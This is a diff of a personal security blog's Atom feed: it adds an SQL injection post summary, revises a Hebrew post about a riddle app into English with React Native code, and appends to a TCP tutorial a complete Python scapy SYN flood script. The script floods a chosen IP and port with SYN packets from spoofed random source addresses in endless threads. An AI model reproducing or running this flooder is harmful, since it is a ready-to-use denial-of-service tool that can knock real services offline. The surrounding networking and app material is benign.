@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-12-03T14:16:19+02:00</updated><id>http://localhost:4000/</id><title type="html">Guy Zwerdling</title><subtitle>A stunning blog of freaking PT warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">TCP connection</title><link href="http://localhost:4000/2017/11/24/TCP-connection.html" rel="alternate" type="text/html" title="TCP connection" /><published>2017-11-24T00:00:00+02:00</published><updated>2017-11-24T00:00:00+02:00</updated><id>http://localhost:4000/2017/11/24/TCP-connection</id><content type="html" xml:base="http://localhost:4000/2017/11/24/TCP-connection.html">&lt;p&gt;Ok, I write this post because of two things, the first reason is because I had in interview in some High Tech School and I ran for a teacher job position, the first interview was great, my passion for security and hacking stuff done more than I expected, for one second I thought that I will be a Cyber coacher, but the second interview was worse, In the second interview I was needed to speak about the TCP and UDP protocols, I have a great knowledge about those two, but to be sure I going on to read about theme little more, in the interview I was needed to pass a lesson to some students that doesn’t know nothing about networking nor security stuff, so I try to explain everything but I confused everything and the students found it difficult to understand the material, so I was not accepted to teach there. I remember when I first learn the TCP I have so much question but the teacher doesn’t really give me the all knowledge about TCP so I was needed to look over the Internet and with some Google search I found what I was needed, so these are the two reason why I was write the article, first I have knowledge of TCP and I feel like I need to improve it to myself after I failed in the interview, and second I want that if some one will read that article he will have very good understanding how TCP really work.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-12-03T16:24:38+02:00</updated><id>http://localhost:4000/</id><title type="html">Guy Zwerdling</title><subtitle>A stunning blog of freaking PT warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/2017/11/27/SQL-Injection.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2017-11-27T00:00:00+02:00</published><updated>2017-11-27T00:00:00+02:00</updated><id>http://localhost:4000/2017/11/27/SQL-Injection</id><content type="html" xml:base="http://localhost:4000/2017/11/27/SQL-Injection.html"></content><author><name>Guy Zwerdling</name></author><category term="Injection" /><summary type="html">If you look on top 10 of OWASP about Application Security Risks you may find the greatest vulnerabilities on Applications! The cool thing is that injection is the number one and it may sound weird but there is some website that using SQL (Structured Query Language) and you can attack these website in such type of attack that they really should not work anymore but still does. Let's look on the SQL injection in details</summary></entry><entry><title type="html">TCP connection</title><link href="http://localhost:4000/2017/11/24/TCP-connection.html" rel="alternate" type="text/html" title="TCP connection" /><published>2017-11-24T00:00:00+02:00</published><updated>2017-11-24T00:00:00+02:00</updated><id>http://localhost:4000/2017/11/24/TCP-connection</id><content type="html" xml:base="http://localhost:4000/2017/11/24/TCP-connection.html">&lt;p&gt;Ok, I write this post because of two things, the first reason is because I had in interview in some High Tech School and I ran for a teacher job position, the first interview was great, my passion for security and hacking stuff done more than I expected, for one second I thought that I will be a Cyber coacher, but the second interview was worse, In the second interview I was needed to speak about the TCP and UDP protocols, I have a great knowledge about those two, but to be sure I going on to read about theme little more, in the interview I was needed to pass a lesson to some students that doesn’t know nothing about networking nor security stuff, so I try to explain everything but I confused everything and the students found it difficult to understand the material, so I was not accepted to teach there. I remember when I first learn the TCP I have so much question but the teacher doesn’t really give me the all knowledge about TCP so I was needed to look over the Internet and with some Google search I found what I was needed, so these are the two reason why I was write the article, first I have knowledge of TCP and I feel like I need to improve it to myself after I failed in the interview, and second I want that if some one will read that article he will have very good understanding how TCP really work.&lt;/p&gt;
 
 &lt;p&gt;The well none protocol named TCP is one of the important protocol that really matter in the wide network of today. This protocol as a big play part
 in the Internet in general, many protocols relay on TCP and many protocols designed in such way that without TCP they cannot run. The Important thin
@@ -644,102 +644,151 @@ The problem with that operation is that we always need to resend some packets th
 &lt;p&gt;&lt;img src=&quot;/assets/images/kali4.png&quot; alt=&quot;kali4&quot; title=&quot;kali4&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
 &lt;strong&gt;Figure 51&lt;/strong&gt; More sniffing.&lt;/p&gt;
 
-&lt;p&gt;To kill the attack just type ctrl+c, in my case after I killed the attack I was able to connect my DG.&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><category term="network" /><summary type="html">The TCP is freaking amazing! it helps you to track down the packets over the net and knowing for surely that they arrived to the other endpoint succesfully. also if the packets arrived to the other endpoint not in the same order they was sent in the first place, the other side will now what is the right sequence of the packets and arrange theme correctly. Let's dive in to the TCP world!</summary></entry><entry><title type="html">אביעה חידות</title><link href="http://localhost:4000/2017/10/23/Abiha-hidot.html" rel="alternate" type="text/html" title="אביעה חידות" /><published>2017-10-23T00:00:00+03:00</published><updated>2017-10-23T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/23/Abiha-hidot</id><content type="html" xml:base="http://localhost:4000/2017/10/23/Abiha-hidot.html">&lt;p dir=&quot;rtl&quot;&gt;
-אוקיי... אז סיימתי סוף סוף את האפליקציה, אביעה חידות מני קדם מוכנה ויושבת בחנות של גוגל, זאת הייתה עבודה קשה אבל זה משתלם כי עכשיו יש לי נסיון גם בריאקט&lt;br /&gt; נייטיב (react native) וזה ממש טוב!&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-אני מרוצה מהתוצאה הסופית.. קיבלתי חלק מהפידבקים חיובים וחלק פחות חיוביים, הרבה אמרו לי שהאפליקציה ממש קשה, ואני כזה... נו מה... למה ציפיתם הרי התשובות&lt;br /&gt; כתובים ממש בפרשיות זה חייב להיות קשה לכו ללמוד את הפרשיות, כנראה שחלק ילכו אבל החלק הגדול לא, לכן חשבתי לעשות משהו אחר&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-מלבד לכתוב מה הפרשייה ובעצם להודיע למשתמה ששם התשובה, אני אביא לו את המקורות לנייד ככה שהוא יוכל לשבת וללמוד ואז הרווחנו שני ציפורים במכה אחת&lt;br /&gt;
-הוא גם יישב וילמד וגם יענה וירוויח נקודות.. הנאה כפולה מהמשחק&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-בעקרון יש לי מספר מטרון כדלהלן&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-- להעביר את כפתור האיפוס למסך הראשי&lt;br /&gt;
-- לשנות את כל האפליקציה לעבוד עם flex&lt;br /&gt;
-- להוסיף פרס למי שמסיים את האפליקציה&lt;br /&gt;
-- להוסיף הודעה משמחת על כל 100 יהלומים שזוכים&lt;br /&gt;
-- להוסיף מוסיקה&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-כן הייתם מאמינים, כשבניתי את האפליקיציה לא חשבתי לעשות FLEX איזו טעות חמורה&lt;br /&gt;
-אבל אני עוד אסדר את זה וזה למען האמת החלק הקל&lt;br /&gt;
-מה עם מוסיקה, לעשות משהו מקורי או להביא חיקוי זול? ואם לעשות משהו מקורי אז מוסיקה מוסיקה או סתם רעשים שונים ברקע...&lt;br /&gt;
-&lt;br /&gt;
-אני צריך לחשוב על זה, בנתיים אני כבר לא עובד על האפליקציה אני פותר תרגילים באינטרנט ולומד התקפות ברמת אבטחת מידע&lt;br /&gt;
-אני מקווה למצא עבודה טובה בתחום עם צוות טוב ומגובש שזה הדבר החשוב באמת&lt;br /&gt;
-&lt;br /&gt;
-ובחזרה לאפליקציה&lt;br /&gt;
-אני רוצה לנצל את ההזדמנות להציג פה חלקים ממנה&lt;br /&gt;
-&lt;br /&gt;
-זה המסך הראשי של האפליקציה, ברגע שמתחילים במשחק ולוחצים תשובה נכונה, במקום &quot;התחל&quot; יהיה כתוב &quot;המשך&quot; זה היה מאוד קשה לעשות את זה כי מדובר על שני סקשנים נפרדים&lt;br /&gt;
-ובשביל לעבור ממסך למסך השתמשתי בנוויגייטור (navigator) והיה צריך להכניס ערכים מיוחדים בשביל לעשות את זה&lt;br /&gt;
-העיקר זה עבד&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/images/app2.jpg&quot; alt=&quot;HomeScreen&quot; title=&quot;HomeScreen&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;To kill the attack just type ctrl+c, in my case after I killed the attack I was able to connect my DG.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-rube&quot; data-lang=&quot;rube&quot;&gt;#!/usr/bin/env python
+#########################################
+#
+# SYNflood - A multithreaded SYN Flooder
+# author: arthurnn
+#
+#
+#########################################
+import socket, random, sys, threading
+from scapy.all import *
+
+if len(sys.argv) != 3:
+	print &quot;Usage: %s &amp;lt;Target IP&amp;gt; &amp;lt;Port&amp;gt;&quot; % sys.argv[0]
+	sys.exit(1)
+
+target = sys.argv[1]
+port = int(sys.argv[2])
+
+total = 0
+conf.iface='en1';#network card XD
+
+class sendSYN(threading.Thread):
+	global target, port
+	def __init__(self):
+		threading.Thread.__init__(self)
+	def run(self):
+		i = IP()
+		i.src = &quot;%i.%i.%i.%i&quot; % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+		i.dst = target
+
+		t = TCP()
+		t.sport = random.randint(1,65535)
+		t.dport = port
+		t.flags = 'S'
+
+		send(i/t, verbose=0)
+
+print &quot;Flooding %s:%i with SYN packets.&quot; % (target, port)
+while 1:
+	sendSYN().start()
+	total += 1
+	sys.stdout.write(&quot;\rTotal packets sent:\t\t\t%i&quot; % total)
+
+
+  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name>Guy Zwerdling</name></author><category term="network" /><summary type="html">The TCP is freaking amazing! it helps you to track down the packets over the net and knowing for surely that they arrived to the other endpoint succesfully. also if the packets arrived to the other endpoint not in the same order they was sent in the first place, the other side will now what is the right sequence of the packets and arrange theme correctly. Let's dive in to the TCP world!</summary></entry><entry><title type="html">Nach Riddles!</title><link href="http://localhost:4000/2017/10/23/Abiha-hidot.html" rel="alternate" type="text/html" title="Nach Riddles!" /><published>2017-10-23T00:00:00+03:00</published><updated>2017-10-23T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/23/Abiha-hidot</id><content type="html" xml:base="http://localhost:4000/2017/10/23/Abiha-hidot.html">&lt;p&gt;Ok, so I finished the application, now it’s on Google Play, the name of the app is “Habia Histom Meni Kedem” of “Nach Riddle”. For me it was realy interesting, and now I have knowledge in React Native, may be when I step foreword I will develop more applications in React-Native, but maybe not. For sure I know that I will be developer in script languages such Python and JavaScripts because of Cyber stream area, I know that I need that knowledge, I have some book in reverse engineer using Python.&lt;/p&gt;
+
+&lt;p&gt;So, my app is very good I think, I got good and bad feedback about that, the game is really hard so I’m sure that some people will leave that game because of the difficulty.&lt;/p&gt;
+
+&lt;p&gt;I think to change some stuff in the app, maybe it will be good:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Give the user the possibility to learn the material which the riddle are based on.&lt;/li&gt;
+  &lt;li&gt;Move the reset button to the opening screen.&lt;/li&gt;
+  &lt;li&gt;changing the app to work with Flex.&lt;/li&gt;
+  &lt;li&gt;add some price to the end of the game.&lt;/li&gt;
+  &lt;li&gt;add some music.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I haven’t used Readex yet but I will, some of the code is presented here:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;render() {
+  let width = Dimensions.get('window').width;
+  let font = width / 10;
+  console.log(font)
+  return (
+    &amp;lt;ScrollView&amp;gt;
+    &amp;lt;View style={styles.container}&amp;gt;
+      &amp;lt;Image
+        style={styles.imageStyle}
+        source={require('../img/opening-img2.jpg')}
+      &amp;gt;
+        &amp;lt;View style={styles.backdropView}&amp;gt;
+          &amp;lt;Text style=&amp;gt;אביעה חידות מני קדם&amp;lt;/Text&amp;gt;
+          &amp;lt;Image
+            style=
+            source={require('../img/Book.png')}
+          /&amp;gt;
+            &amp;lt;Text style={styles.lineText}&amp;gt;1188 חידות על הנביא&amp;lt;/Text&amp;gt;
+            &amp;lt;View style={styles.buttonView}&amp;gt;
+              &amp;lt;TouchableOpacity
+                onPress={() =&amp;gt; this.props.navigation.navigate('Riddles', { home: this.onChangeCount.bind(this)})}
+              &amp;gt;
+                &amp;lt;View style={styles.button}&amp;gt;
+                  &amp;lt;Text style={styles.buttonText}&amp;gt;{this.checkBeginning()}&amp;lt;/Text&amp;gt;
+                &amp;lt;/View&amp;gt;
+              &amp;lt;/TouchableOpacity&amp;gt;
+            &amp;lt;/View&amp;gt;
+            &amp;lt;View style={styles.buttonView}&amp;gt;
+              &amp;lt;TouchableOpacity
+                onPress={() =&amp;gt; this.props.navigation.navigate('Introduction')}
+              &amp;gt;
+                &amp;lt;View style={styles.button}&amp;gt;
+                  &amp;lt;Text style={styles.buttonText}&amp;gt;הוראות&amp;lt;/Text&amp;gt;
+                &amp;lt;/View&amp;gt;
+              &amp;lt;/TouchableOpacity&amp;gt;
+            &amp;lt;/View&amp;gt;
+            &amp;lt;View style={styles.buttonView}&amp;gt;
+              &amp;lt;TouchableOpacity
+                onPress={() =&amp;gt; this.props.navigation.navigate('About')}
+              &amp;gt;
+                &amp;lt;View style={styles.button}&amp;gt;
+                  &amp;lt;Text style={styles.buttonText}&amp;gt;אודות&amp;lt;/Text&amp;gt;
+                &amp;lt;/View&amp;gt;
+              &amp;lt;/TouchableOpacity&amp;gt;
+            &amp;lt;/View&amp;gt;
+        &amp;lt;/View&amp;gt;
+      &amp;lt;/Image&amp;gt;
+    &amp;lt;/View&amp;gt;
+    &amp;lt;/ScrollView&amp;gt;
+  )
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&amp;lt;/p&amp;gt;
+&lt;img src=&quot;/assets/images/app2.jpg&quot; alt=&quot;HomeScreen&quot; title=&quot;HomeScreen&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
 &lt;p dir=&quot;rtl&quot;&gt;
 &lt;br /&gt;
 &lt;br /&gt;
-אנשים המליצו לי להוסיף כפתור איפס כבר במסך הזה לאיפוס המשחק ולהוסיפ עוד כפתור של סאונד אם יהיה במסך הזה והכי חשוב שלא יהיה ניתן לגלול את המסך הזה כלומר שהוא&lt;br /&gt; יהיה קבוע ומקובע... צריך לראות איך עושים את זה כי זה לא נשמע פשוט&lt;br /&gt;
+
 &lt;br /&gt;
 &lt;br /&gt;
 &lt;br /&gt;
 
 
-
-המסך השני קצת יותר מורכב מהקודם, במסך הזה אמרו לי אנשים שבחלק הקלדת התשובה יהיו אותיות שהינם מתוך התשובה&lt;br /&gt;
-האתם שעשיתי את זה בהתחלה אבל היה ממש מסובך לשייך את האותיות למקום המתאים בגרירה ואולי זה אשפרי עם רידקס (redax) אבל אני לא בטוח&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/images/app3.jpg&quot; alt=&quot;Riddle&quot; title=&quot;Riddle&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
 &lt;p dir=&quot;rtl&quot;&gt;
 &lt;br /&gt;
-עקרונית במסך הזה בקובעיה של החידון זה למעשה יהיה כפתור שפותח לנו את הפרשה המלאה&lt;br /&gt;
-השאלה הנוספת ונניח שאני מחליט לתת פרס למי שהצליח לענות על החידון, איך אני מודה שהוא באמת ענה ולא מרמה אותי, בנוסף האם להגיד מהו הפרס? הרי הפרס הוא הספר&lt;br /&gt;
- המקורי, לפחות על זה חשבתי וזה נשמע לי רעיון פצצה&lt;br /&gt;
+
 &lt;br /&gt;
 &lt;br /&gt;
 &lt;br /&gt;
 
 
-אם המשתמש טעה בחידה חשבתי פעם להוריד לו יהלומים אבל אני לא יודע, אולי לא כדאי, בנתיים זה מה יש&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/images/app4.jpg&quot; alt=&quot;wrong&quot; title=&quot;wrong&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
-&lt;p dir=&quot;rtl&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/app4.jpg&quot; alt=&quot;wrong&quot; title=&quot;wrong&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;
 &lt;br /&gt;
 &lt;br /&gt;
-&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
 
-
-זה החלק הכי מגניב כי חנות הרמזים היא בעצם מה שנותנת הנאה מהמחק מלבד החידות עצמןשהם גאוניות&lt;br /&gt;
-החישוב ברמזים הוא עלות, כלומר כל רמז עולה יהלומים ואם אין מספיק אז נחשו מה.... איי אפשר להתקדם עם רמזים בלבד לכל אורך המשחק&lt;br /&gt;
-זה מכריח מהמשתמש להתאמץ וזה מה שכייף&lt;br /&gt;
-&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/images/app5.jpg&quot; alt=&quot;diamonds&quot; title=&quot;diamonds&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
-&lt;p dir=&quot;rtl&quot;&gt;
-&lt;br /&gt;
-מישהו אמחר לי  שזה יכול להיות משחק שימושי למטרות חינוך, אני מסכים אבל האם זה ילך, אין לי שמץ&lt;br /&gt;
-&lt;br /&gt;
-
+&lt;p&gt;&lt;img src=&quot;/assets/images/app5.jpg&quot; alt=&quot;diamonds&quot; title=&quot;diamonds&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;
 &lt;br /&gt;
 &lt;br /&gt;
-&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
 
-
-
-
-המסך האחרון להיום בהמשך למסך הקודם&lt;br /&gt;
-&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/images/app1.jpg&quot; alt=&quot;diamonds2&quot; title=&quot;diamonds2&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;
-&lt;p dir=&quot;rtl&quot;&gt;
-&lt;br /&gt;
-שלא תגידו שהמשחק הזה לא מושקע, זה לקח לי חודשיים וחצי בשביל ההנאה שלכם!&lt;br /&gt;
-אז יאללה תהנו!!!&lt;br /&gt;
-&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><summary type="html">אני כותב בעברית כי זאת האפליקציה הראשונה שלי והוא בעברית והכל בעברית אז מי שלא יודע עברית שילך ויילמד אני קרעתי את התחת</summary></entry><entry><title type="html">Heb Page TEST!</title><link href="http://localhost:4000/2017/10/17/heb-page.html" rel="alternate" type="text/html" title="Heb Page TEST!" /><published>2017-10-17T00:00:00+03:00</published><updated>2017-10-17T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/17/heb-page</id><content type="html" xml:base="http://localhost:4000/2017/10/17/heb-page.html">&lt;p dir=&quot;rtl&quot;&gt;
-לא בטוח שיש לי תמיכה בעברית אבל צריך לוודא
-&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><summary type="html">אני כותב בעברית כדי לראות אם זה עובד</summary></entry><entry><title type="html">Nach Riddles on Google Play!</title><link href="http://localhost:4000/2017/10/15/Finish-the-App.html" rel="alternate" type="text/html" title="Nach Riddles on Google Play!" /><published>2017-10-15T00:00:00+03:00</published><updated>2017-10-15T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/15/Finish-the-App</id><content type="html" xml:base="http://localhost:4000/2017/10/15/Finish-the-App.html">&lt;p&gt;Hello everyone, We want to update that the development of the application has been successfully completed and you can download the application from Google Play&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/app1.jpg&quot; alt=&quot;diamonds2&quot; title=&quot;diamonds2&quot; class=&quot;img-responsive&quot; height=&quot;500px&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><summary type="html">k, so I finished the application, now it's on Google Play, the name of the app is &quot;Habia Histom Meni Kedem&quot; of &quot;Nach Riddle&quot;</summary></entry><entry><title type="html">Nach Riddles on Google Play!</title><link href="http://localhost:4000/2017/10/15/Finish-the-App.html" rel="alternate" type="text/html" title="Nach Riddles on Google Play!" /><published>2017-10-15T00:00:00+03:00</published><updated>2017-10-15T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/15/Finish-the-App</id><content type="html" xml:base="http://localhost:4000/2017/10/15/Finish-the-App.html">&lt;p&gt;Hello everyone, We want to update that the development of the application has been successfully completed and you can download the application from Google Play&lt;/p&gt;
 
 &lt;p&gt;ou&lt;/p&gt;
 &lt;h2&gt;&lt;a href=&quot;https://zwerd.com/NachRiddles/&quot;&gt;Nach Riddles&lt;/a&gt;&lt;/h2&gt;
